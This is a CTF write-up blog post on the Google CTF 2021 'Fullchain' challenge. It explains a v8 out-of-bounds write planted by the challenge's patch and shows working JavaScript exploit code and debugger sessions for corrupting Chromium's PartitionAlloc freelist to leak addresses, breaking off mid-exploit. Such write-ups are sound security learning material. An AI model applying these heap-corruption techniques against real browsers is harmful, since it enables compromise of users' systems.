<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Google CTF 2021 - Fullchain" /><meta name="author" content="Duc Phan" /><meta property="og:locale" content="en_US" /><meta name="description" content="This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing exploit for chromium browser in the challenge Fullchain of Google CTF 2021. Since I have never tried a chrome sandbox escape or partition alloc exploit, this is a fantastic opportunity to learn both. Let’s go!" /><meta property="og:description" content="This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing exploit for chromium browser in the challenge Fullchain of Google CTF 2021. Since I have never tried a chrome sandbox escape or partition alloc exploit, this is a fantastic opportunity to learn both. Let’s go!" /><link rel="canonical" href="https://ret2.life/posts/Google-CTF-2021/" /><meta property="og:url" content="https://ret2.life/posts/Google-CTF-2021/" /><meta property="og:site_name" content="ret2life" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-20T23:15:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Google CTF 2021 - Fullchain" /><meta name="twitter:site" content="@flyingpassword" /><meta name="twitter:creator" content="@Duc Phan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Duc Phan"},"dateModified":"2021-08-23T11:49:13+08:00","datePublished":"2021-07-20T23:15:00+08:00","description":"This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing exploit for chromium browser in the challenge Fullchain of Google CTF 2021. Since I have never tried a chrome sandbox escape or partition alloc exploit, this is a fantastic opportunity to learn both. Let’s go!","headline":"Google CTF 2021 - Fullchain","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2.life/posts/Google-CTF-2021/"},"url":"https://ret2.life/posts/Google-CTF-2021/"}</script><title>Google CTF 2021 - Fullchain | ret2life</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ret2life"><meta name="application-name" content="ret2life"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1417881771534819331/0AuUptMd_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ret2life</a></div><div class="site-subtitle font-italic">From CTF write-ups to everyday life kind of things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span></span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ducphanduyagentp" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/flyingpassword" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['youreallythingimmaputemail','on.here?'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> </a> </span> <span>Google CTF 2021 - Fullchain</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" ></span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Google CTF 2021 - Fullchain</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Duc Phan </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2021-07-20 23:15:00 +0800" >2021-07-20 23:15:00 +0800<i class="unloaded">2021-07-20T23:15:00+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="2021-08-23 10:49:13 +0700 " >2021-08-23 10:49:13 +0700 <i class="unloaded">2021-08-23T11:49:13+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4593 ">25 </span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 50% 50%'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/fullchain/fullchain-01.png" class="preview-img" alt="Preview Image" width="50%" height="50%"><p>This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing exploit for chromium browser in the challenge Fullchain of Google CTF 2021. Since I have never tried a chrome sandbox escape or partition alloc exploit, this is a fantastic opportunity to learn both. Let’s go!</p><h2 id="challenge-overview">Challenge Overview</h2><p>As the challenge name has implied, we need to write a fullchain exploit starting from the chromium renderer and all the way to the linux kernel. This write-up only concerns the renderer and sandbox escape parts. Please find the details about the kernel exploit on my teammate <a href="https://trungnguyen1909.github.io/blog/post/GGCTF21">ntrung03</a>. There are several files provided in the challenge:</p><ul><li><code class="language-plaintext highlighter-rouge">v8_bug.patch</code> and <code class="language-plaintext highlighter-rouge">sbx_bug.patch</code>: The patch files that introduce bugs in v8 (chromium javascript engine) and chromium browser.<li><code class="language-plaintext highlighter-rouge">run_chromium.py</code>: A script to run our exploit in the provided chromium.<li><code class="language-plaintext highlighter-rouge">chromium</code>: Provided chromium build<ul><li><code class="language-plaintext highlighter-rouge">mojo_bindings</code>: MojoJS bindings<li><code class="language-plaintext highlighter-rouge">chrome</code>: The chromium binary</ul></ul><p>When we first tried to run the chrome binary, it didn’t work. Looking at the runner script reveals that it is run in headless mode and so the UI may not working. I decided to build chromium with the UI for easy debugging (the console and getting PIDs.)</p><p>The general approach to this challenge is to exploit the renderer bug to enable mojo, then execute the sandbox escape exploit.</p><h2 id="renderer-exploit">Renderer Exploit</h2><h3 id="21-the-bug---renderer">2.1. The Bug - Renderer</h3><p>Let’s look at <code class="language-plaintext highlighter-rouge">v8_bug.patch</code> to understand the bug:</p><div class="language-patch highlighter-rouge"><div class="code-header"> <span text-data=" Patch "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gd">--- a/src/builtins/typed-array-set.tq
</span><span class="gi">+++ b/src/builtins/typed-array-set.tq
</span><span class="p">@@ -198,7 +198,7 @@</span> TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
...
   // 9. Let targetLength be target.[[ArrayLength]].
<span class="gd">-  const targetLength = target.length;
</span><span class="gi">+  // const targetLength = target.length;
</span><span class="err">
</span>   // 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr = typedArray.length;
...
   // 21. If srcLength + targetOffset &gt; targetLength, throw a RangeError
   //   exception.
<span class="gd">-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
</span><span class="gi">+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  //     otherwise IfOffsetOutOfBounds;
</span></pre></table></code></div></div><p>The bug is basically an out-of-bound (OOB) write, happening because the range check in <code class="language-plaintext highlighter-rouge">TypedArray.prototype.set</code> is removed. This method allows setting the content of a TypedArray from a regular Array or from another TypedArray. The bug is in the latter variant.</p><p>It can be triggered like so:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">ta_src</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">ta_victim</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
<span class="nx">ta_src</span><span class="p">.</span><span class="nf">fill</span><span class="p">(</span><span class="mh">0x41</span><span class="p">);</span>

<span class="c1">// This sets the content of ta_victim starting from the 0x20-th element with the content of ta_src</span>
<span class="c1">// ta_victim only has 0x10 elements</span>
<span class="c1">// Regularly, this will throw a RangeError exception as mentioned in the patch comment.</span>
<span class="nx">ta_victim</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">ta_src</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
</pre></table></code></div></div><h3 id="22-exploit-strategy---renderer">2.2. Exploit Strategy - Renderer</h3><p>This is the first part of the exploit chain, so the goal here is to enable mojo to allow sandbox escape.</p><p>There are several tasks that we usually need to achieve when writing exploit</p><ol><li>We need an information leak to calculate useful addresses, such as the chrome binary base, the heap metadata base, etc. We only have an OOB write, how do we get a leak?<li>We need an arbitrary write primitive. In this case, it is used to enable mojo.<li>We need to avoid crashing the process at our best. We can’t just pop calc and go brrrr.</ol><p>Since this is quite a similar goal as the 0CTF/TCTF 2020 Chromium challenge, I heavily referred to its write-ups <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> <sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>. The major difference between regular v8 exploit and this exploit is that the allocator in chromium is PartitionAlloc (PA), while on linux, v8 still uses glibc malloc. In addition, there are certain hardening measures <sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup> in PA that we need to bypass for a successful exploit.</p><h3 id="23-from-partition-alloc-to-mojo">2.3. From Partition Alloc to Mojo</h3><p>We started with an OOB write on an PA allocated memory chunk. Just like regular heap exploit, there are some places to start:</p><ol><li>How are allocated memory organized?<li>Can we read/write any useful information relatively from the allocated chunk? We can look for metadata and see how PA uses it.<li>What type of checks are there for allocating/freeing memory?</ol><p>To help examining objects in chrome, we can pass the <code class="language-plaintext highlighter-rouge">--js-flags="--allow-natives-syntax</code> flag to chrome and <code class="language-plaintext highlighter-rouge">%DebugPrint</code> objects from the console. In this case, I allocated an ArrayBuffer and look at its allocated backing store. In a release build, it may be difficult to look at the ArrayBuffer layout because of pointer compression, so an easy way to locate the memory is set the first few bytes with a marker value and search for it in pwndbg like so:</p><pre><code class="language-gdb"># This searches writable memory with the marker qword value

pwndbg&gt; search --qword -w 0x1337133713371335
    0x2562085e9004 0x1337133713371335
    0x2562085ebe08 0x1337133713371335
    0x335e01628000 0x1337133713371335
pwndbg&gt; x/20gx 0x335e01628000
0x335e01628000:	0x1337133713371335	0x0000000000000000
0x335e01628010:	0x0000000000000000	0x0000000000000000
0x335e01628020:	0x408062015e330000	0xbf7f9dfea1ccffff
0x335e01628030:	0x0000000000000000	0x0000000000000000
0x335e01628040:	0x608062015e330000	0x9f7f9dfea1ccffff
0x335e01628050:	0x0000000000000000	0x0000000000000000
0x335e01628060:	0x808062015e330000	0x7f7f9dfea1ccffff
0x335e01628070:	0x0000000000000000	0x0000000000000000
0x335e01628080:	0xa08062015e330000	0x5f7f9dfea1ccffff
0x335e01628090:	0x0000000000000000	0x0000000000000000
</code></pre><p>Here I allocated an ArrayBuffer of size 0x20, and we can already see some interesting values around the allocated memory. It looks like some address, but in reversed? This means it is stored in big-endian format. And we can see <code class="language-plaintext highlighter-rouge">0x408062015e330000</code> points to <code class="language-plaintext highlighter-rouge">0x335e01628040</code>, the free slot after the allocated slot. These turn out to be <strong>pointers to the next free slots</strong>, stored in the first qword of other free slots, and they are part of a <strong>freelist</strong>. If we allocate 0x20 bytes twice again, <code class="language-plaintext highlighter-rouge">0x335e01628020</code> and <code class="language-plaintext highlighter-rouge">0x335e01628040</code> will be returned respectively. The freelist stores the pointer to the next free slot.</p><p>At this point, one can think of faking the pointer to the next free slot and have PA allocate it. Let’s try it out</p><pre><code class="language-gdb"># Fake a free slot at 0x335e01628010, right within our allocated ArrayBuffer
pwndbg&gt; set {long long} 0x335e01628020 = 0x108062015e330000

Received signal 4 ILL_ILLOPN 55f492fec856
#0 0x55f49306aac9 base::debug::CollectStackTrace()
#1 0x55f492fd5bb3 base::debug::StackTrace::StackTrace()
#2 0x55f49306a5f1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f6f45b003c0 (/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)
#4 0x55f492fec856 base::internal::(anonymous namespace)::FreelistCorruptionDetected()
#5 0x55f4976ad302 blink::ArrayBufferContents::AllocateMemoryWithFlags()
#6 0x55f49714b6e2 blink::(anonymous namespace)::ArrayBufferAllocator::Allocate()
#7 0x55f491ec709d v8::internal::Heap::AllocateExternalBackingStore()
#8 0x55f491ff2f3a v8::internal::BackingStore::Allocate()
#9 0x55f491da1f42 v8::internal::(anonymous namespace)::ConstructBuffer()
#10 0x55f491da0c67 v8::internal::Builtin_Impl_ArrayBufferConstructor()
#11 0x25620007b7f8 &lt;unknown&gt;
  r8: 0000000000000040  r9: 0000000000000001 r10: 0000256200000013 r11: 0000000008203e99
 r12: 0000000000000008 r13: 0000335e01628020 r14: 000055f498fd6218 r15: 0000335e0053a200
  di: 00007ffe551305b8  si: ef7f9dfea1ccffff  bp: 00007ffe551305c0  bx: 0000000000000003
  dx: 0000000000000020  ax: 0000335e01601140  cx: 108062015e330000  sp: 00007ffe551305b0
  ip: 000055f492fec856 efl: 0000000000010202 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000006 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
</code></pre><p>Oops, what do we have here? <code class="language-plaintext highlighter-rouge">FreelistCorruptionDetected()</code> ? This must be some hardening. Looking at the <a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/partition_freelist_entry.h;l=189;drc=7654fdf966826ee830992abf4ac7df453dfc3317">code</a> of PA, this is a hardening measure implemented in <code class="language-plaintext highlighter-rouge">GetNext()</code></p><div class="language-c++ highlighter-rouge"><div class="code-header"> <span text-data=" C++ "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">ALWAYS_INLINE</span> <span class="n">PartitionFreelistEntry</span><span class="o">*</span> <span class="n">PartitionFreelistEntry</span><span class="o">::</span><span class="n">GetNext</span><span class="p">(</span>
    <span class="kt">size_t</span> <span class="n">extra</span><span class="p">)</span> <span class="k">const</span> <span class="p">{</span>
<span class="cp">#if defined(PA_HAS_FREELIST_HARDENING)
</span>  <span class="c1">// GetNext() can be called on decommitted memory, which is full of</span>
  <span class="c1">// zeroes. This is not a corruption issue, so only check integrity when we</span>
  <span class="c1">// have a non-nullptr |next_| pointer.</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">UNLIKELY</span><span class="p">(</span><span class="n">next_</span> <span class="o">&amp;&amp;</span> <span class="o">~</span><span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uintptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">next_</span><span class="p">)</span> <span class="o">!=</span> <span class="n">inverted_next_</span><span class="p">))</span>
    <span class="n">FreelistCorruptionDetected</span><span class="p">(</span><span class="n">extra</span><span class="p">);</span>
<span class="cp">#endif  // defined(PA_HAS_FREELIST_HARDENING)
</span>  <span class="k">auto</span><span class="o">*</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">EncodedPartitionFreelistEntry</span><span class="o">::</span><span class="n">Decode</span><span class="p">(</span><span class="n">next_</span><span class="p">);</span>
</pre></table></code></div></div><p>PA stores a mask of the pointer right next to it, and the mask is the inverted (by doing NOT bitwise operation) of the pointer. This is why we see values like <code class="language-plaintext highlighter-rouge">0xbf7f9dfea1ccffff</code> right next to the free slot pointers. The check here has 2 parts:</p><ul><li>If the <code class="language-plaintext highlighter-rouge">_next</code> pointer is null, move on<li>If the <code class="language-plaintext highlighter-rouge">_next</code> pointer is non-nullptr, check if <code class="language-plaintext highlighter-rouge">~next_ == inverted_next_</code></ul><p>The first part is quite important for later (I’ll explain why). But for now, to bypass this check, we need to also craft the <code class="language-plaintext highlighter-rouge">inverted_next_</code> value. And this yeilds a successful allocation to our controlled address.</p><p>Next step is, how do we do this with the OOB write? Because we don’t know any useful address (yet), we can’t fake a full address. But we can partially overwrite an address and its inverted value, hopefully it will be valid. But what address should we target? Reading past write-ups, we know that a slot address is useful because we can use it to derive up to the metadata page address. Conveniently, this address is populated in free slots. We can proceed with the following plan:</p><ol><li>Try to allocate to an address that is within an ArrayBuffer we controlled, because we can only read data within valid ranges.<li>Free the allocated address so that it is populated with a slot address. Then we use our ArrayBuffer to read this leaked data.</ol><p>After some trial and error, I’ve come up with the following way to leak the slot address:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="c1">// We need to maintain a no GC list to prevent slots from being garbage-collected unintendedly</span>
<span class="kd">let</span> <span class="nx">no_gc</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">let</span> <span class="nx">N</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span> <span class="c1">// Alloc size</span>

<span class="c1">// AB and TA for 1-byte r/w</span>
<span class="nx">data_ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="nx">data_ta</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">data_ab</span><span class="p">);</span>

<span class="c1">// This AB is used to read the leak later. We want an overlapping slot with this AB</span>
<span class="nx">ab1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span><span class="p">);</span>
<span class="nx">ta1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">ab1</span><span class="p">);</span>
<span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">ab1</span><span class="p">);</span>

<span class="c1">// Overwrite the last byte of the next freelist ptr, 1 alloc away.</span>
<span class="nx">ta_leak</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">ab1</span><span class="p">);</span>
<span class="nx">data_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
<span class="nx">ta_leak</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">data_ta</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
<span class="c1">// Overwrite the inverted byte</span>
<span class="nx">data_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xef</span>
<span class="nx">ta_leak</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">data_ta</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span> <span class="o">+</span> <span class="mi">15</span><span class="p">);</span>

<span class="c1">// Alloc 1st time to get freelist head off</span>
<span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span><span class="p">);</span>
<span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>
<span class="c1">// Alloc one more time to get to the overwritten pointer</span>
<span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span><span class="p">);</span>
<span class="nx">tmpa</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>
<span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>

<span class="c1">// Marker, see if it is overlapped in ab1</span>
<span class="nx">tmpa</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">leak_idx</span> <span class="o">=</span> <span class="nx">ta1</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">tmpa</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="c1">// If we get overlapping slots, we will find this marker value in ab1</span>
<span class="k">if </span><span class="p">(</span><span class="nx">leak_idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// throw "Did not get overlapping chunk";</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nf">reload</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Trigger GC to populate overlapping slot with pointer</span>
<span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">N</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Need to wait for leak to populate;</span>
<span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">pa_leak_hi</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">pa_leak_lo</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">ta1</span><span class="p">[</span><span class="nx">leak_idx</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x41414141</span> <span class="o">||</span> <span class="nx">ta1</span><span class="p">[</span><span class="nx">leak_idx</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
            <span class="c1">// throw "Did not get leak";</span>
        <span class="p">}</span>

        <span class="nx">pa_leak_lo</span> <span class="o">=</span> <span class="nx">ta1</span><span class="p">[</span><span class="nx">leak_idx</span><span class="p">];</span>
        <span class="nx">pa_leak_hi</span> <span class="o">=</span> <span class="nx">ta1</span><span class="p">[</span><span class="nx">leak_idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
